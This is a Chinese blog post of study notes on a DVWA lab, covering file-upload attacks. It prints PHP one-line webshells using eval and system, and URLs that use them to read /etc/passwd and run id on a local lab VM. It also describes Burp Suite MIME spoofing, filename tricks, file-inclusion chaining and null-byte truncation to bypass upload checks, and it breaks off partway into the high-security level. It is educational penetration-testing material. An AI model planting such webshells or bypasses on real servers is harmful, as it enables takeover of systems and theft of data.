<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>hacker-learning | DreamHacker</title><meta name="keywords" content="hacker"><meta name="author" content="Purplezi"><meta name="copyright" content="Purplezi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考资料      https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av53347991?p&#x3D;1 https:&#x2F;&#x2F;space.bilibili.com&#x2F;282616786 前端根源 https:&#x2F;&#x2F;www.w3.org&#x2F;Protocols&#x2F;rfc2616&#x2F;rfc2616.html https:&#x2F;&#x2F;www.offensive-security.com&#x2F; kali 中国镜像：">
<meta property="og:type" content="article">
<meta property="og:title" content="hacker-learning">
<meta property="og:url" content="https://purplezi.gitee.io/2021/03/12/hacker-learning/index.html">
<meta property="og:site_name" content="DreamHacker">
<meta property="og:description" content="参考资料      https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;av53347991?p&#x3D;1 https:&#x2F;&#x2F;space.bilibili.com&#x2F;282616786 前端根源 https:&#x2F;&#x2F;www.w3.org&#x2F;Protocols&#x2F;rfc2616&#x2F;rfc2616.html https:&#x2F;&#x2F;www.offensive-security.com&#x2F; kali 中国镜像：">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://w.wallhaven.cc/full/j8/wallhaven-j8lkxw.png">
<meta property="article:published_time" content="2021-03-12T04:47:46.000Z">
<meta property="article:modified_time" content="2021-03-12T08:19:36.068Z">
<meta property="article:author" content="Purplezi">
<meta property="article:tag" content="hacker">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://w.wallhaven.cc/full/j8/wallhaven-j8lkxw.png"><link rel="shortcut icon" href="/img/icon1.png"><link rel="canonical" href="https://purplezi.gitee.io/2021/03/12/hacker-learning/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-03-12 16:19:36'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> Books</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/photos/"><i class="fa-fw fas fa-images"></i><span> Photo</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://w.wallhaven.cc/full/j8/wallhaven-j8lkxw.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">DreamHacker</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> Books</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/photos/"><i class="fa-fw fas fa-images"></i><span> Photo</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hacker-learning</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-03-12T04:47:46.000Z" title="Created 2021-03-12 12:47:46">2021-03-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-03-12T08:19:36.068Z" title="Updated 2021-03-12 16:19:36">2021-03-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>参考资料</span></div>
    <div class="hide-content"><ul>
<li>https://www.bilibili.com/video/av53347991?p=1</li>
<li>https://space.bilibili.com/282616786</li>
<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods">前端根源</a></li>
<li>https://www.w3.org/Protocols/rfc2616/rfc2616.html</li>
<li>https://www.offensive-security.com/</li>
<li>kali 中国镜像：https://mirrors.tuna.tsinghua.edu.cn/kali-images/</li>
</ul>
</div></div>
<p>攻击工具（用于我们自己的业务环境或者授权以后的相应测试） - 中国菜刀 - Burpsuite</p>
<h1 id="攻击环境">攻击环境</h1>
<p>靶机：OWASP Broken Web Apps (BWA) VM1.2.7</p>
<p>php 版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -v</span><br><span class="line">PHP 5.3.2</span><br></pre></td></tr></table></figure>
<p>攻击机 / 渗透机：Kali 2019.3 - VMware tools 安装</p>
<hr />
<p>VMware 联网方式</p>
<ul>
<li>NAT
<ul>
<li>NAT 交换机</li>
<li>地址转换</li>
<li>外部机器无法访问内部虚拟机</li>
</ul></li>
<li>桥接
<ul>
<li>和物理主机的 IP 一致 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重新获取IP</span></span><br><span class="line"><span class="comment"># 1. 重启机器</span></span><br><span class="line"><span class="comment"># 2. dhclient</span></span><br><span class="line">dhclient -r eth0 <span class="comment"># -r release 人工释放IP</span></span><br><span class="line">dhclient -v eth0 <span class="comment"># 分配IP</span></span><br><span class="line">dhclinet eth0</span><br></pre></td></tr></table></figure> kali 联网方式：https://nimdati.com/2020/01/18/kali-linux-virtualbox-2-network-adapters-nat-host-only-dhcp/</li>
</ul></li>
</ul>
<h1 id="文件上传漏洞渗透攻击">文件上传漏洞渗透攻击</h1>
<h2 id="原理">原理</h2>
<blockquote>
<p>日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接最有效，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件，有没有经过检测验证，如果服务器的处理逻辑做的不够安全，则会导致严重的后果</p>
<p>指由于程序员未对上传的文件进行<u>严格的验证和过滤</u>、没有限制上传类型或者限制不严格被绕过，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等，导致网站被控制和服务器沦陷等，主要攻击 Web 服务</p>
<p>正常的文件一般是文档、图片、视频等，Web 应用收集之后放入后台储存，需要的时候再调出来返回；如果恶意文件如 PHP、ASP 等执行文件绕过 Web 应用并顺利执行，相当于黑客直接拿到了 Webshell，则可以拿到 Web 应用的数据，执行删除 Web 文件、本地提权、拿下服务器甚至整个内网等操作</p>
<blockquote>
<p>webshell 常常被称为入侵者通过网站端口对网站服务器的某种程度上<u>操作的权限</u></p>
<p>由于 webshell 其大多是以动态脚本的形式(asp、php、jsp)出现，也称之为<u>网站的后门工具</u></p>
<p>webshell 是 web 应用类似于 bash 的 shell 应用程序，bash 是控制 Linux 系统的，webshell 控制网站</p>
</blockquote>
</blockquote>
<p><img src="fileupload.png" /></p>
<p>DVWA 的 Upload 测试</p>
<ul>
<li>low security
<ul>
<li>能够成功上传 php 文件(上传任意文件类型)</li>
<li>会在页面显示路径<code>../../hackable/uploads/webshell.php</code>，在浏览器中输入<code>http://192.168.50.129/dvwa/vulnerabilities/upload/../../hackable/uploads/webshell.php</code>得到地址<code>http://192.168.50.129/dvwa/hackable/uploads/webshell.php</code></li>
<li>上传 php，内容为<code>&lt;?php @eval($_POST['pass']);?&gt;(一句话木马)</code>，pass 为中国菜刀的密码 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php中</span><br><span class="line">@:阻止警告输出，不显示错误信息</span><br><span class="line">$:变量</span><br><span class="line">&amp;:变量的地址</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>( string <span class="variable">$code</span>) — 把字符串作为PHP代码执行，允许执行任意 PHP 代码</span><br><span class="line">该字符串必须是合法的 PHP 代码，且必须以分号结尾</span><br></pre></td></tr></table></figure></li>
<li>打开中国菜刀，右键添加，输入<code>http://192.168.50.129/dvwa/hackable/uploads/webshell.php</code>和密码，右键文件管理，能够看到所有文件 <img src="filemanage.png" /> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename( <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul></li>
</ul>
<p><strong>Webshell</strong></p>
<ul>
<li>小马：<u>一句话木马</u>，即整个 shell 代码量只有一行，一般是系统执行函数</li>
<li>大马：代码量和功能比小马多，一般会进行二次编码加密，防止被安全防火墙 WAF /入侵系统 IDS 检测到 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php代码(一) 名称shell1.php</span></span><br><span class="line"><span class="comment"># 上传至dvwa的后端</span></span><br><span class="line"><span class="comment"># eval使用php函数，例如phpinfo()</span></span><br><span class="line"><span class="comment"># REQUEST是在网页端输入变量访问</span></span><br><span class="line"><span class="comment"># POST则是使用像中国菜刀之类的工具连接，是C/S架构</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在浏览器URL栏中输入http://192.168.50.129/dvwa/hackable/uploads/shell1.php?pass=phpinfo();</span></span><br><span class="line"><span class="comment"># pass同eval函数方括号中的值</span></span><br><span class="line"><span class="comment"># 则页面会展示phpinfo()函数的结果，其他php函数同理</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># php代码(二) 名称shell2.php</span></span><br><span class="line"><span class="comment"># system使用Linux系统命令，例如ls,cp,rm</span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//192.168.50.129/dvwa/hackable/uploads/shell2.php?pass=cat /etc/passwd</span></span><br><span class="line">http:<span class="comment">//192.168.50.129/dvwa/hackable/uploads/shell2.php?pass=id</span></span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中国菜刀之php代码</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>medium security
<ul>
<li><strong>绕过类型上传文件，<u>文件 mime 类型</u></strong>
<ul>
<li>限制文件类型和大小 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">        <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> image/jpeg(支持.jpg .jpeg 文件)并不是指扩展名，而是指 MIME 类型(媒体类型 Multipurpose Internet Mail Extensions 是一种标准，用来表示文档、文件或字节流的性质和格式)，位于 html 的 content-type，告知对方是什么类型的文件，用什么打开。<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 简介</a></li>
</ul></li>
</ul></li>
</ul>
<hr />
<div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>【medium】解决方法</span></div>
    <div class="hide-content"><p><strong>法一：抓包修改文件类型 - 上传 php，修改 content-type</strong></p>
<h3 id="burpsuite">Burpsuite</h3>
<ul>
<li>代理 Proxy、拦截、爬虫 Spider、漏洞扫描 Scanner(专业版)、攻击... <img src="burpsuite.png" />
<ul>
<li><p>客户端将浏览器的地址指向代理</p></li>
<li><p>拦截的目的是为了<u>修改请求</u></p></li>
<li><p>服务器的响应直接发给客户端，无需经过代理服务器？？？</p>
<p>php: application/octet-stream</p></li>
<li><p>Burpsuite 的 incerption is on 表示开始拦截</p></li>
<li><p>火狐-preferences &gt; Advanced &gt; Network Connection Settings，默认情况下<code>Use system proxy settings</code>，修改为<code>Manual proxy configuration</code>，将<code>HTTP Proxy</code>修改为<code>127.0.0.1</code>，<code>Port</code>为<code>8080</code>，随意勾选<code>Use this proxy server for all protocols</code></p></li>
</ul></li>
</ul>
<ol type="1">
<li><p>Kali 内部的 firefox(即 firefox 和 Burpsuite 在<strong>同一台</strong>机器)的代理设置为 Burpsuite</p>
<ul>
<li><p>设置浏览器代理</p>
<p><img src="kali-firefox-proxy.png" alt="manualproxyconfiguration" style="zoom:80%;" /></p></li>
<li><p>此时代理工作在 127.0.0.1(本地)的 8080 端口上</p>
<p><img src="burpsuite-proxy-option.png" alt="burpsuite-proxyoption" style="zoom:80%;" /></p></li>
<li><p>开启 burpsuite 后</p>
<p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tnlp</span><br><span class="line"><span class="comment"># 输出如下</span></span><br><span class="line">State    Recv-Q   Send-Q           Local Address:Port        Peer Address:Port</span><br><span class="line">LISTEN   0        50          [::ffff:127.0.0.1]:8080                   *:*       users:((<span class="string">&quot;java&quot;</span>,pid=2134,fd=28))  </span><br></pre></td></tr></table></figure></p></li>
</ul></li>
<li><p>外部物理机的 firefox 的代理设置为 Burpsuite</p>
<ul>
<li><p>此时能够访问到代理 ip 的机器都可以使用代理，把 running 勾上</p>
<p><img src="burpsuite-all.png" alt="burpsuite配置" style="zoom:80%;" /></p></li>
<li><p>物理机的 firefox 的网络代理设置为如下，ip 地址即 Burpsuite 所在机器的 ip 地址</p>
<p><img src="phy-firefox.png" alt="手动代理配置" style="zoom:80%;" /></p></li>
</ul></li>
<li><p>上传 php 文件</p>
<p><img src="uploadphp-package.png" /></p>
<p>将 application/octet-stream 修改为 image/jpeg 即可上传成功</p>
<ul>
<li>如果这里把 php 文件后缀名改成图片后缀名如 jpg，则中国菜刀无法识别该木马，所以无法成功。因为中国菜刀的原理是向上传文件发送包含‘pass’参数的 post 请求，通过控制‘pass’参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送 post 请求时，服务器只会返回这个‘图片’静态文件，并不会执行相应命令</li>
</ul></li>
</ol>
<hr />
<p>参考：https://www.freebuf.com/articles/web/119467.html</p>
<p>法二：组合拳（文件包含+文件上传） - 【未成功】</p>
<ul>
<li>新建 hack.php，写入一句话木马。因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查。<u>修改</u>文件名为 hack.png</li>
<li>upload 上传。借助 low 级别的文件包含漏洞来获取 webshell 权限，打开中国菜刀，右键添加，在地址栏中输入<code>http://192.168.50.129/dvwa/vulnerabilities/fi/?page=http://192.168.50.129/dvwa/hackable/uploads/hack.png</code>，脚本语言选择 php</li>
<li>点击添加，成功获取 webshell 权限</li>
</ul>
<hr />
<p>法三：上传刚才的修改好的 hack.png 文件（首先让浏览器识别 content-type 为 image/png），抓包，将 filename 修改为 hack.php，能够上传成功，菜刀也能成功连接</p>
<p><img src="pngtophp.png" /></p>
<hr />
<p>法四：截断绕过规则 - 【无法成功】</p>
<ul>
<li><p>在 php 版本小于 5.3.4 的服务器中，当 Magic_quote_gpc 选项为 off 时，可以在文件名中使用 %00 截断，所以可以把上传文件命名为 hack.php%00.png。Burpsuite 抓包，得到包中的文件类型为 image/png，可以通过文件类型检查</p>
<p><img src="00cutoff.png" /></p>
<p><img src="00cutoff-success.png" alt="image-20200806121453487" style="zoom:70%;" /></p>
<ul>
<li>而服务器会认为其文件名为 hack.php，顺势解析为 php 文件。即打开菜刀，http://192.168.50.129/dvwa/hackable/uploads/hack861.php%00.png - 无法成功</li>
</ul></li>
</ul>
</div></div>
<hr />
<ul>
<li><p>high security</p>
<ul>
<li><strong>上传一句话图片木马，<u>文件后缀限制</u></strong></li>
<li>此时修改 Content-Type 无用，因为此处限制的不是类型，而是后缀 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">        <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$uploaded_ext</span> = substr(<span class="variable">$uploaded_name</span>, strrpos(<span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPG&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpeg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPEG&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul></li>
